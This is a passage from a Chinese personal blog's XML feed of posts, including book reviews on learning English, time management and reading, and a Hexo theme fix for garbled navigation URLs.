        <content type="html"><![CDATA[<p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200211/blogimage/bdc.png" alt="不背单词，能学好英语吗？" title="不背单词，能学好英语吗？"><br>不背单词，能学好英语吗？<br>学习英语是我永远的痛，读书的时候没有把英语学好，工作后觉得英语很重要，经历了N多次从坚持到放弃。这一次，我是来真的，发誓不把英语学好不罢休，为此我下载了百词斩。为了有人监督我加入了打卡群，每天坚持英语背单词打卡，这是我坚持做得最好的一件事情，每天早上起床第一件事情就是背单词，每天20-30个，几乎从来没有中断过。但是我坚持到330天后，我还是决定放弃背单词了。为什么呢？因为没效果！！！我已经背完了从小学到大学以及新概念1-2册的单词，APP上显示我的词汇量已经达到7000，超过了80%的网友。可是我看英语文章还是一脸懵逼，即使是最浅的英语读物也有单词不认识。听不懂，更别奢望能说了。英语单词背了忘、忘了背，严重怀疑这个APP上显示7000多的单词量是哄我开心的，要不背了这么久的单词，英语水平还这么菜，依旧啥也看不懂……</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200211/blogimage/englishisharet.png" alt="学英语是会呼吸的痛" title="学英语是会呼吸的痛"></p><p>放弃背单词，并不代表我放弃了英语，因为我找了一本书–《人人都能用英语》。经过傻傻的认为打卡背单词就可以学好英语沉痛而失败的教训后，越发认为这本书相见恨晚。学英语就是要用，要不学英语干啥？坚持非常重要，但是坚持的方向错了一切都是白搭！</p><p>这不是一本英语的单词书、语法书。是一本教你如何学英语，不，应该是如何“用”英语的书。作者是我们都很熟悉的曾经是新东方专业英语老师，现在是比特币首富的–李笑来老师，《把时间当做朋友》的作者。虽然是专业的英语老师，在书中他没有卖弄自己的专业，而是非常真诚的讲述了自己学习英语的过程。整本书解决了我所有学英语的疑惑。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200211/blogimage/%E4%BA%BA%E4%BA%BA%E9%83%BD%E8%83%BD%E7%94%A8%E8%8B%B1%E8%AF%AD1.png" alt="《人人都能用英语》" title="《人人都能用英语》"></p><p>经历了N多次从坚持到放弃，我曾经就差点相信学习英语要有天赋才能学好，自己不是学英语的那块料。在书中作者花了很大量的篇幅来告诉我们，人人都可以学好英语！书中举了个例子，大约在1988年前后，他父亲的同事一位教英语的副教授去考了一次托福，成绩是570（满分677分），一个专职的英语教授考托福才考570分，想想这是个多么难的考试。当年，甚至若干年作者都不敢想象自己能够去考托福。直到2000年底，他急需要一份稳定的工作，想去新东方应聘，他花了4个月的时间专注学习，考了托福，考了GRE，拿了变态的成绩去应聘了新东方成为了那里的英语教师。他以亲身经历说明了一个问题，你学不好，是因为你不信，只有你相信你能做好，你才能真正做好。哪里有那么多天才呢？所谓的天才，只不过是反复练习，持之以恒的结果。</p><p>不要再“学”英语，你就应该“用”英语！这是最触动我的一句话，也是整本书的核心。大部分的人，包括我都是从初中、高中、大学，“学”了近十来年的英语，真正学会的人又有几个呢？只“学”不“用”的下场就是在十几年之后依然在学依然无用。依旧陷入从坚持到放弃的怪圈。学英语的核心其实是在用。只有不断地“用”，才能真正地学到，要不就会一直停留在“学”的阶段。既然不“用”就“学”不好，那不如从一开始就直接“用”。无论如何，一定要想明白对自己来说，英语真正的用处在哪儿？对于很多人来说，其实只要能够流利阅读英语或许已经足够了，至少对我来说已经够了。既然想要流利的阅读英语，那就直接从“用”英语阅读开始，抛开所谓的单词量、语法、语音、语调。不会的单词查字典，看不懂的句子查语法书。不管你是想流利的阅读，还是用英语交流，反正，用就是了。回想一下，也是哦，想想自己小学语文的经历，小学一年级还学下生字，二年级就开始学用字典查生字，以后慢慢的抛开字典可以自由的读写了。</p><p>其实如何通过“用”来学习外语，国学大师、学界泰斗季羡林，季老先生在自己的言传身教中已经说的非常清楚，并且可操作性非常强。他说到：“我想斗胆提出一个，‘无师自通’的办法，供胡同志和其他读者参考。你只需要找一位通德语的人，用上二三个小时，把字母读音学好。从此你就可以丢掉老师这个拐棍，自己行走了。你找一本有可靠的汉文译文的德文科技图书，伴之以一本浅易的德文语法。先把语法了解个大概的情况，不必太深入，就立即读德文原文，字典反正不能离手，语法也放在手边。一开始必然如堕入五里雾中。读不懂，再读，也许不止一遍两遍。等到你认为对原文已经有了一个大概的了解，为了验证自己了解的正确程度，只是到了此时，才把那一本可靠的译本拿过来，看看自己了解得究竟如何。就这样一页页读下去，一本原文读完了，再加以努力，你慢慢就能够读没有汉译本的德文原文了。”</p><p>嗯，我想我可以放心的放弃背单词，拿起我的那本英文版的《Spring in Action》开始慢慢啃了……</p><hr><center>关注：“爱分享读书”微信公众号 </center><p><img src="http://image.ishareread.com/qrcode_for_gh_70fb5d85a824_258.jpg" alt="“爱分享读书”微信公众号" title="“爱分享读书”微信公众号"></p><center>读书我们是认真的</center>]]></content>
      
      
      <categories>
          
          <category> 读书 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读后感 </tag>
            
            <tag> 英语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>把时间当作朋友，相信我，你并不孤独</title>
      <link href="/posts/a0bb2f7e/"/>
      <url>/posts/a0bb2f7e/</url>
      
        <content type="html"><![CDATA[<p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200106/blogimage/3.jpg" alt="把时间当做朋友" title="把时间当做朋友"><br>相信我，你并不孤独！自卑、对任何事情都没有兴趣、在工作多年后，对未来还是很迷茫，对自己的效率不满，对自己的能力怀疑。相信在此世间，此时此刻，困恼的不是我一个。  </p><p>《把时间当作朋友》这本书2009年出版，现在这本书已经是第三版了，并且还推出了逻辑思维独家定制版。该书长期在豆瓣上评分都是在8.3分以上，无数人看了以后都感觉到相见恨晚，受益匪浅。作者李笑来原来是新东方的老师，现在号称是投资人，比特币首富。新东方的老师像创始人俞敏洪、锤子手机的老罗、古典等都有个特点，都很都善于灌鸡汤，兜售所谓的成功学，很有煽动性。可以理解像英语那么枯燥有难度的学习过程，如果没有成功学的激励被放弃的几率还是蛮大的。成功离不开鸡血，也少不了鸡汤。   </p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200106/blogimage/4.jpg" alt="《把时间当做朋友》" title="《把时间当做朋友》"><br>《把时间当作朋友》这本书从心智成长的角度来谈时间管理、学习方法、兴趣、人脉等成功的关键所在。虽然书中有个章节是”小心所谓的成功学”。但不可否认，这本书就是告诉大家如何了解时间，和时间做朋友，用心智成长开启自己的人生成功之旅的“成功学”。其中的某些观点和做法我觉得很有道理并值得付之于行动。  </p><p>首先是对时间管理的认识，有很多书都在谈时间管理，而时间每天每个人都只有24小时，都在静静的不以人的意识为转移地流逝。时间它是不会听从任何人的管理，我们无法管理时间，我们真正能够管理的是我们自己。而管理好自己就是需要通过自己的大脑控制自己的大脑，需要有很强的意志力和成熟的心智。  </p><p>管理好自己利用好时间，需要对自己的时间有个清楚的了解，知道自己的时间都花到哪里去了。最有效的办法就是《奇特的一生》的作者，苏联生物学家柳比歇夫的事件-事件日志记录方法。将自己每天做的每件事情都花的多少时间详细的记录下来。想尽一切办法真正了解自己，真正了解时间，精确地感知时间，而后再想办法使自己的行为与时间”合拍”，与时间做朋友。  </p><p>学会了如何利用好自己的时间，接下来的就是行动。什么时候开始行动呢？如果要打算做某件事情，并且想做成的话，应该是立刻、马上、立即、now就开始行动！  </p><p>开始行动后就要学会坚持。所有学习上的成功，都只靠两件事：策略和坚持，而坚持本身就是最重要的策略，坚持其实就是重复，而重复说到底就是时间的投入，任何领域想要取得卓越的成就都必须用一生的努力才能取得，想要出类拔萃，就要努力至少一万小时。</p><h2 id="关于学习方法："><a href="#关于学习方法：" class="headerlink" title="关于学习方法："></a><strong>关于学习方法：</strong></h2><p>除了“试错”、“观察”、“阅读”之外，“思考”准确的说是“正确地思考”才是获得真正意义上的知识的主要手段。<br>提高自学能力</p><ol><li>自学能力的基础技能是阅读理解能力。</li><li>检索能力是建立在相当熟练的阅读能力之上的能力。</li><li>写作能力在自学能力中占据着重要的地位。</li><li>实践能力是自学能力最终能够转换为真正价值的根本。<br>教是最好的学习方法。</li></ol><h2 id="关于兴趣："><a href="#关于兴趣：" class="headerlink" title="关于兴趣："></a><strong>关于兴趣：</strong></h2><p>很多人，包括我自己，不知道自己的兴趣在哪里？或试图要培养自己的兴趣。书中的一段话给我很大的启示，只要一件事你能做好，并且做得比谁都好，或者至少比大多数人好，你就不会对那件事情没兴趣。往往并不是有兴趣才能做好，而是做好了才有兴趣。  </p><p>大多数事情都需要孰能生巧，做得多了，自然就擅长了，擅长了，就自然比别人做得好，做得比别人好，兴趣就大起来了，而后就更加喜欢做，更擅长，更……良性循环。但同样做得多久需要大量的时间投入，没兴趣，往往只不过是结果而已，如果被当做不去做好的理由，最终的惩罚就是大量的时间白白的流逝。</p><h2 id="关于人脉："><a href="#关于人脉：" class="headerlink" title="关于人脉："></a><strong>关于人脉：</strong></h2><p>打造人脉不如打造自己，只有优秀的人才拥有有效的人脉。  </p><p>关于书中讲到了通过自己的大脑控制自己的大脑。其实就是个人意志力的问题，只是书中换了个说法。个人的成功很大程度都是取决于个人意志力。通过意志力控制心智成长，让人成熟，成功。  </p><p>如果你现在还在迷茫，相信我，你并不孤独。把这本书看完吧。再牛逼的人都有段苦逼的经历，如果你还在苦逼的过程中，请把时间当做朋友，沉下心来慢慢学习积累，收获成长，笃性自己能够成功！大家一起共勉。</p><hr><center>关注：“爱分享读书”微信公众号 <p><img src="http://xiejava.gitee.io/xiejavaimagesrc/images/%E7%88%B1%E5%88%86%E4%BA%AB%E8%AF%BB%E4%B9%A6%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“爱分享读书”微信公众号" title="“爱分享读书”微信公众号"></p><p>读书我们是认真的</p></center>]]></content>
      
      
      <categories>
          
          <category> 读书 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读后感 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>终身学习时代，阅读是你大脑的磨刀石</title>
      <link href="/posts/da35ea85/"/>
      <url>/posts/da35ea85/</url>
      
        <content type="html"><![CDATA[<p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200106/blogimage/1.jpg" alt="图书馆" title="图书馆"><br>  在这个互联网信息知识大爆炸的时代，学习能力是每个人的核心能力，如何通过学习把知识转化为自己的能力，拓宽人生的可能性，是每个人孜孜不倦渴求的。而阅读，尤其是高效的阅读是掌握知识最简单、成本最低、也是最高效的学习方式。阅读能力是学习能力的根本，会阅读的人才会具备快速学习的能力和良好思维以及应变能力。认识到这一点，所以想读书的人越来越多，爱读书的人越来越多。但是很多人在阅读或培养阅读的过程中碰到了各种各样的困难和问题。如：知道阅读很重要，但是拿起书就想睡觉根本看不进书；没有时间阅读；读不懂，记不住，用不上等等。市面上也涌现了不少教大家阅读的书籍，如被誉为阅读圣经的《如何阅读一本书》、《越读者》、《书都不会读，你还想成功》、《如何高效读懂一本书》等等。</p><p>  好脑筋需要书本，就如同宝剑需要磨刀石。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200106/blogimage/2.jpg" alt="好脑筋需要书本，就如同宝剑需要磨刀石" title="好脑筋需要书本，就如同宝剑需要磨刀石"></p><p>  通过阅读我们可以系统性地获取知识，但很多人在阅读习惯养成的前期也会面临很多问题，很多人对阅读有障碍、有困难，实际上是我们对阅读这件事的理解并不清晰透彻，我们应该了解阅读的本质。阅读的本质就是在可以利用的时间里，以你自己能理解的程度去学习。有些初学者了解到阅读的重要性以后，心情非常迫切，一上来就捧起大部头的书，或者比较深奥烧脑的书看，结果要不就是看几页昏昏入睡，要不就是看了几天都看不完，渐渐的失去了耐心，阅读兴趣和想培养的阅读习惯也就在屡次的打击中放弃了。其实要想开始阅读或培养阅读习惯，最有效的办法就是根据自己的能力先从一些入门级的自己感兴趣的书籍着手。在《书都不会读，你还想成功》的书中，就是建议先给自己定个计划读100本书开始，这100本书先抛开任何功利性的想法，不管什么书，只要是自己感兴趣的或者能够看得下去的书就可以，看不下去的书先放一边，通过100本书慢慢培养自己的阅读兴趣和习惯。先有了阅读兴趣和习惯，想看了愿意看了。再来谈阅读方法的问题，通过阅读方法解决看得快，记得牢的问题。再来逐渐选择高于自己目前能力的书籍进行有目的性的阅读。</p><p>  其实阅读方法正如《洋葱阅读法》里所述，无非就是碎片化阅读、快速阅读、主题阅读。不管是那种阅读方法，都是需要带有强烈目的性的阅读，只有有目的的阅读，然后学以致用才能看得快，记得牢，用得上。</p><p>  碎片阅读实际就是利用碎片化的时间，学习碎片化的内容。如何取得碎片化阅读的效果呢？有人每天都碎片化的阅读一些微信文章啥的，但是长期以来除了感觉有些文章写得不错每天点赞外，对自己并没有什么提高呢。其中最关键的就是要建立自己的知识体系。在基于自己的知识体系的基础上将阅读到的碎片化的内容补充到自己的知识体系中建立相应的联系。要不然阅读到的碎片还是碎片，不和已有的知识进行关联，永远都是碎片，久而久之久会忘记掉。没有自己的知识体系就相当于没有建立自己的银行账户，碎片化阅读看到的内容相当于打零工赚回来的钱没有地方放。东放一点，西放一点时间久了自然就忘记了。有了自己的知识体系就相当于建立自己的知识银行账户，打零工赚的钱可以零存整取，不断的往自己的知识体系中填砖加瓦，让自己的知识银行账户余额越存越多。</p><p>  如何构建自己的知识体系呢，就要通过快速阅读和主题阅读。一本书本身的就是某个知识系统化的描述。所以要想系统的构建自己的知识体系，系统的看书是必经之路。</p><p>  快速阅读的本质就是提升阅读的速度，快速掌握书中的知识。核心就是带着问题来阅读。在阅读之前，先了解一下自己读这本书的目的，梳理一下问题，为什么要读这本书，这本书能够解决我什么问题，自己以前有没有读过类似的书等等。通过快速的阅读，在书中找这些问题。有些无关紧要的描述就可以快速略看，与问题相关的仔细阅读。通过变速阅读达到快速了解一本书掌握关键知识点的目的。</p><p>  主题阅读则更是为了构建自己的知识体系，在某个知识主题领域，通过广泛的阅读，同时阅读多本相同主题书的方式来深入对某个知识主题领域学习的过程。其主要目的是搞懂某个主题领域的知识。</p><p>  当然不管是碎片化阅读、快速阅读、主题阅读，要想通过阅读来提高自己的能力，首先要有构建自己知识体系的意识；其次是通过某种方式彻底的搞懂自己没有懂的知识如通过反复阅读，一本书重复多读几遍或通过读同一知识点不同作者写的书来搞懂，或者通过费曼读书法将阅读的知识通过自己的理解用自己的方式讲述给懂的人；最后就是要学以制用，将通过阅读学到的知识在平时的工作、生活、学习等各个方面用起来。只有这样才能真正的通过阅读不断的提高自己的能力，真正找到阅读的乐趣，越读越有味，越读越想读！</p><hr><center>关注：“爱分享读书”微信公众号 <p><img src="http://xiejava.gitee.io/xiejavaimagesrc/images/%E7%88%B1%E5%88%86%E4%BA%AB%E8%AF%BB%E4%B9%A6%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“爱分享读书”微信公众号" title="“爱分享读书”微信公众号"></p><p>读书我们是认真的</p></center>]]></content>
      
      
      <categories>
          
          <category> 读书 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读后感 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用系统方式思考，高效的工作</title>
      <link href="/posts/f7e86db6/"/>
      <url>/posts/f7e86db6/</url>
      
        <content type="html"><![CDATA[<p>　　用系统方式工作的思想是萨姆·卡彭特在《用系统来工作》的书中提到的。大家可以想想华为、富士康等公司为什么效率高？因为有一套系统化的流程让各个环节高效的运作。所以咱们也可以参考，运用到我们的工作、学习、生活中来，让我们更高效。 </p><p>　　所有工作都可以用系统的视角的思考。如管理公司、上班的日常工作、学一门技能、健身等等。<br>　　首先我们要明确目标，比如管理公司我要达到什么经营目标，学习我要学到什么东西达到什么程度，减肥健身要达到什么效果，一定要有非常清晰的目标，最好是能够写下来，放在显眼的地方，时时关注。<br>　　其次我们要制定准则，即达到实现目标的大的方针，比如减肥健身，准则可以定义为控制饮食、加强锻炼等。<br>　　最后我们要明确做事的流程，如何明确流程？可以按照以下几点整理。<br>　　1、分解每个工作的任务项。<br>　　 将一个工作分解成一个个可以操作的具体任务项。如开会可以分解为确定会议室、准备会议材料、通知会议参与人、做会议纪要、跟踪会议结论执行情况等等。<br>　　 如减肥健身可以分解为：合理饮食、准备活动、有氧运动、肌肉强化运动、睡眠休息等等。<br>　　2、将每个工作任务项按依赖顺序整理形成固化的流程<br>　　 有些工作项是有依赖关系的，所以我们要按照依赖关系顺序整理成流程。先干什么，后干什么，这样做事才会更有条理，减少等待的时间更高效。<br>　　3、给每个工作任务项提供说明指导<br>　　 就是将每个细化的工作项做到最好。在华为，所有的岗位，每项工作都有具体的作业指导书。在作业指导书中详细定义了这个环节需要做什么，具体怎么做，完成后如何检查反馈。这个作业指导书是不断总结完善的。所以不管是老手，还是新来的菜鸟，都可以很好并高效的完成。<br>　　4、在实践的工作中不断完善流程<br>　　 一开始可能流程并不完善，我们可以在实际实施的过程中不断的优化调整，去掉一些不必要的环节，优化一些效率低下的环节，一切优化都是遵循我们开始定义的目标。 </p><p>　　通过系统方式思考做事情可以用到工作、学习、生活的各个方面，总的来说，就是明确目标、制定准则、定义流程，不断完善流程。将事情高效的做好。作为领导者，有了流程后，你还可以将这个流程交给任何一个人都可以做好。将自己释放出来。有更多的时间平衡工作、学习、生活。这就是系统的力量。</p><hr><center>关注：“爱分享读书”微信公众号 <p><img src="http://xiejava.gitee.io/xiejavaimagesrc/images/%E7%88%B1%E5%88%86%E4%BA%AB%E8%AF%BB%E4%B9%A6%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“爱分享读书”微信公众号" title="“爱分享读书”微信公众号"></p><p>读书我们是认真的</p></center>]]></content>
      
      
      <categories>
          
          <category> 读书 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读后感 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决Hexo博客导航栏链接URL乱码问题</title>
      <link href="/posts/5661/"/>
      <url>/posts/5661/</url>
      
        <content type="html"><![CDATA[<p>今年的计划之一是搭建一个博客，开始写博客。于是在网上找了一些博客程序发现用Hexo在gitHub上搭建自己的个人博客是比较简单而且易于维护的做法。<br>在网上找了一些教程后开始搭建，用自己比较中意的hexo-theme-next模板，发现搭建成功后导航栏链接不对，出现了URL乱码的问题。在网上搜索了一把发现有些网友也碰到了类似的问题不过都还没有解决。<br>我是从 <a href="https://github.com/Doublemine/hexo-theme-next.git" target="_blank" rel="noopener">https://github.com/Doublemine/hexo-theme-next.git</a> 这里Fork下来的。仔细看了一下Fork下来的hexo-theme-next模板代码,尝试自己解决。</p><h2 id="问题现象："><a href="#问题现象：" class="headerlink" title="问题现象："></a>问题现象：</h2><p>URL乱码出现在两个地方，一个是上面的导航栏，一个是右边栏的“日志”菜单部分。<br>导航栏链接乱码问题<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200105/blogimage/blogerror1.png" alt="乱码" title="导航栏链接乱码问题"><br>右边栏的“日志”菜单部分链接乱码问题<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200105/blogimage/blogerror3.png" alt="乱码" title="右边栏的“日志”菜单部分"><br>发现链接后面都有乱码<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200105/blogimage/blogerror2.png" alt="乱码" title="链接乱码"></p><h2 id="解决方法："><a href="#解决方法：" class="headerlink" title="解决方法："></a>解决方法：</h2><h3 id="1-解决导航栏URL乱码"><a href="#1-解决导航栏URL乱码" class="headerlink" title="1.解决导航栏URL乱码"></a>1.解决导航栏URL乱码</h3><p>查看themes\hexo-theme-next\layout_partials 下面的 header.swig 代码和模板的配置文件 \themes\hexo-theme-next_config.yml，发现导航栏链接乱码是因为菜单配置是有空格造成的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;li class&#x3D;&quot;menu-item menu-item-&#123;&#123; itemName | replace(&#39; &#39;, &#39;-&#39;) &#125;&#125;&quot;&gt;</span><br><span class="line">  &lt;a href&#x3D;&quot;&#123;&#123; url_for(path.split(&#39;||&#39;)[0]) | trim &#125;&#125;&quot; rel&#x3D;&quot;section&quot;&gt;</span><br><span class="line">&#123;% if theme.menu_icons.enable %&#125;</span><br><span class="line">  &lt;i class&#x3D;&quot;menu-item-icon fa fa-fw fa-&#123;&#123; path.split(&#39;||&#39;)[1] | trim | default(&#39;question-circle&#39;) &#125;&#125;&quot;&gt;&lt;&#x2F;i&gt; &lt;br &#x2F;&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;&#123; __(&#39;menu.&#39; + name) | replace(&#39;menu.&#39;, &#39;&#39;) &#125;&#125;</span><br><span class="line">  &lt;&#x2F;a&gt;</span><br><span class="line">&lt;&#x2F;li&gt;</span><br></pre></td></tr></table></figure><p>因为url_for函数会将字符串转码，碰到空格或其他特殊字符会进行转意，就会出现乱码。<br>解决的办法是修改模板的配置文件 \themes\hexo-theme-next_config.yml文件去掉空格就是的。<br>原始配置文件配置如下：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200105/blogimage/codeblock1.png" alt="原始配置文件" title="原始配置文件"><br>去掉链接字符串的空格<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200105/blogimage/codeblock2.png" alt="去掉空格后的配置文件" title="去掉空格后的配置文件"></p><h3 id="2-解决右边栏的“日志”菜单部分URL的乱码"><a href="#2-解决右边栏的“日志”菜单部分URL的乱码" class="headerlink" title="2.解决右边栏的“日志”菜单部分URL的乱码"></a>2.解决右边栏的“日志”菜单部分URL的乱码</h3><p>在 themes\hexo-theme-next\layout_macro 找到sidebar.swig 文件 找到如下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if config.archive_dir !&#x3D; &#39;&#x2F;&#39; and site.posts.length &gt; 0 %&#125;</span><br><span class="line">  &lt;div class&#x3D;&quot;site-state-item site-state-posts&quot;&gt;</span><br><span class="line">  &#123;% if theme.menu.archives %&#125;</span><br><span class="line">&lt;a href&#x3D;&quot;&#123;&#123; url_for(theme.menu.archives).split(&#39;||&#39;)[0] | trim &#125;&#125;&quot;&gt;</span><br><span class="line">  &#123;% else %&#125;</span><br><span class="line">&lt;a href&#x3D;&quot;&#123;&#123; url_for(config.archive_dir) &#125;&#125;&quot;&gt;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &lt;span class&#x3D;&quot;site-state-item-count&quot;&gt;&#123;&#123; site.posts.length &#125;&#125;&lt;&#x2F;span&gt;</span><br><span class="line">  &lt;span class&#x3D;&quot;site-state-item-name&quot;&gt;&#123;&#123; __(&#39;state.posts&#39;) &#125;&#125;&lt;&#x2F;span&gt;</span><br><span class="line">&lt;&#x2F;a&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>将</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;&#123;&#123; url_for(theme.menu.archives).split(&#39;||&#39;)[0] | trim &#125;&#125;&quot;&gt;</span><br></pre></td></tr></table></figure><p>修改成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;&#123;&#123; url_for(theme.menu.archives.split(&#39;||&#39;)[0]) | trim &#125;&#125;&quot;&gt;</span><br></pre></td></tr></table></figure><p>即可解决。</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020是时候开启最棒的一年了！</title>
      <link href="/posts/ebb1fd51/"/>
      <url>/posts/ebb1fd51/</url>
      
        <content type="html"><![CDATA[<p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200105/blogimage/dream1.png" alt="2020是时候开启最棒的一年了！" title="2020是时候开启最棒的一年了！"></p><p>2019已经过去，回首过去你是否懊恼？本来计划要坚持每天跑步健身的，结果买好了装备坚持了几天后半途而废。雄心勃勃的每天阅读的计划也无疾而终。想把英语学好，却总是停留在书的前几页。我想成为最好的自己、想减肥健康、想多存钱少花钱、想学习新技能、想开创自己的事业……有很多美好的想法，但是事到如今只是美好的想法，回首往事时后悔不已，后悔没有正确的做出决定，后悔没有开始，后悔没有坚持。然而后悔又有什么用呢？岁月还是这样无情的流逝了，你还是原来的那个你。2020年，是时候开启最棒的一年了！</p><p>今年是突破之年！是很多人发自内心的渴望。人们都喜欢在新年制定目标。但是在实现目标的过程中，一开始我们斗志昂扬，大步向前，信心满满。但之后要么计划被打乱，要么最终不了了之。然后大多数人开始以一种失落和懊悔的心情诉说自己的遭遇的一次次挫折和失败。大部分的人都曾经在某些年份制定过新年目标。但是人人都制定目标，并不意味着总是有效。今年是突破之年吗？能够突破制定计划-失败-懊恼-制定计划的怪圈吗？能够真正的突破成就最好的自己吗？</p><p>今年必须是突破的一年！来自全球知名高效能专家迈克尔·海亚特的这本《规划最好的一年》。写给无力改变现状的你，让你从个人、职业、财富、人际关系等全面升级。如果你想摆脱失意与迷茫，走向自信与明朗，获得成功一年的力量。相信《规划最好的一年》一书中有你想要的答案。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200105/blogimage/book1.png" alt="《规划最好的一年》" title="《规划最好的一年》"></p><p>作者迈克尔·海亚特（Michael Hyatt），是全球知名高效能专家，《纽约时报》畅销书作家。全球极具魅力的传媒领袖、平台应用大师、自媒体营销泰斗。曾任美国最大的出版公司之一托马斯·纳尔逊出版公司董事会主席、CEO。他创作过《生命向前》（与丹尼尔·哈卡维合著）以及《平台：从喧闹世界脱颖而出》，荣登过《华尔街日报》《福布斯》《快公司》《企业家》的封面人物。迈克尔·海亚特在美国开设有“5天即达最棒的一年”线上及线下课程，改变了逾千万美国年轻人的命运。</p><p>相信无论你有过什么好的或是不好的经历，即使是在你曾经深度受挫的领域，今年都绝对有可能成为你最有意义的一年。因为这本书告诉了你改变自己具体的做法。是时候开始最棒的一年了。</p><h2 id="STEP-1-相信可能"><a href="#STEP-1-相信可能" class="headerlink" title="STEP 1 相信可能"></a>STEP 1 相信可能</h2><p>要创造最好的一年，首先就要升级观念，树立自我开放性观念，相信一切皆有可能。</p><p>有益的思维习惯往往产生积极的结果，例如幸福感、个体满足感，甚至是物质上的成就。然而，不好的思维习惯往往会产生相反的结果：不幸福感、不满足感，甚至是时运不济的哀怨感。个人的生活格律可以由你改变。即使现有的思维习惯已经带来不错的成果，你还是可以通过升级自己的信念，在生活的各个领域体验变革性的个人进步。一旦我们开始关注信念升级，我们的境况往往也会随之改善。</p><p>如果一个人经历的挫折越多，就会越不相信自己能够战胜挫折。自我怀疑是目标的毒药。消极的心态会毒害我们的灵魂，破坏我们的未来。所以我们要升级观念，改变信念，相信自己能够完成目标。这是决定目标能够实现的第一个关键因素。</p><p>观念升级，避开自我设限性观念陷阱。相信你现在所拥有的，足以改变你的生活。不管现在处于什么环境，我们都有能力追求更好的未来。资源从来都不是我们实现目标过程中的主要挑战。</p><p><em>具体行动计划：</em></p><h3 id="1-认识信念的力量"><a href="#1-认识信念的力量" class="headerlink" title="1.认识信念的力量"></a>1.认识信念的力量</h3><p>如塞尔维亚维托夫尼卡的僧侣撒迪厄斯所言:“我们的想法决定我们的生活。”无论是积极的信念还是消极的信念，都会对生活经历产生巨大影响。明白这个事实，是进入最好的一年的第一阶段。 </p><h3 id="2-直面自我设限性观念"><a href="#2-直面自我设限性观念" class="headerlink" title="2.直面自我设限性观念"></a>2.直面自我设限性观念</h3><p>我们都会有对世界、他人、自己的自我设限性观念。四个检验你是否陷入自我设限性观念的指标，你的观点是否有以下思维形成:非黑即白、主观化、小题大做、普遍化。还有很重要的一点，就是要识别出自我设限性观念的来源，即你的自我设限性观念是来自过去的经验、新闻媒体、社交媒体还是负面关系。 </p><h3 id="3-观念升级-识别自我设限性观念。"><a href="#3-观念升级-识别自我设限性观念。" class="headerlink" title="3.观念升级 识别自我设限性观念。"></a>3.观念升级 识别自我设限性观念。</h3><p>升级观念要从认识观念开始，因此首先要仔细思考阻碍你前进的观念。记录自我设限性观念。在左边的一栏写下自我设限性观念，文字表达有助于将自我设限，性观念客观化。反思自我实现新观念。评估某种观念对你的贡献，这种观念赋予你力量了吗？对你实现目标有帮助吗？摒弃/重构自我设限性观念。有时候你可以直接否定一种自我设限性观念；有时候你可能需要论证推翻它，或是从另一个角度审视障碍。修正自我设限性观念。针对旧的自我设限性观念写下新的自我开放性观念。重新定位。相信新的真理，重新投入生活。</p><h2 id="STEP-2-总结过去"><a href="#STEP-2-总结过去" class="headerlink" title="STEP 2 总结过去"></a>STEP 2 